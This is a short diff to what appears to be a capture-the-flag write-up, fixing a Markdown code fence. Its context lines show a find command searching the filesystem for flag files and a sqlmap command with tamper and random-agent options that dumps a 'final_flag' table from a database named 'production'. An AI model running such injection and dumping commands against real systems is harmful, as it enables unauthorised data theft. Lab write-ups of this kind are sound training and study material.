@@ -95,7 +95,7 @@ find / -type f -iname "*flag*" 2>/dev/null
 ```bash
 sqlmap -r shop.txt --batch -p 'id' --random-agent \
 --tamper=between --dbms=MySQL -D production -T final_flag --dump
-```bash
+```
 ## Outcome
 
 Successfully dumped final_flag table from the production database.
